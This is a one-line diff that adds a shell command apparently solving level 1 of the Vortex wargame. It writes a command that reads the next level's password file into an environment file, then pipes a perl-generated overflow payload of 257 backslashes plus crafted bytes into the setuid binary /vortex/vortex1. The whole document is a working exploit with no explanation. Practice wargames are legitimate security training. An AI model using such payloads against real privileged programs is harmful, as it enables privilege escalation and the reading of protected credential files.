@@ -1,0 +1,1 @@
+echo "cat /etc/vortex_pass/vortex2" > /tmp/vortex1_env && perl -e 'print "\x5c" x 257; print "\xcaA";' | env ENV=/tmp/vortex1_env /vortex/vortex1
